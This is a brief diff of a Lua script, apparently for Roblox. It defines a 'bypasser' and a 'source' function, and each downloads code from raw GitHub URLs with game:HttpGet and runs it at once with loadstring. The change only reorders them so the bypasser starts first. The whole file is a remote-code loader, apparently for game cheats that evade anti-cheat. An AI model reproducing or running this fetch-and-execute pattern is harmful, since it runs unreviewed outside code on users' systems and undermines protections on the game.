@@ -1,9 +1,10 @@
-local function source()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/arkosigma/main/refs/heads/main/gag'))()
-end
 local function bypasser()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/arkosigma/main/refs/heads/main/loader'))()
 end
+local function source()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/arkosigma/main/refs/heads/main/gag'))()
+end
 
-task.spawn(source)
 task.spawn(bypasser)
+task.spawn(source)
+
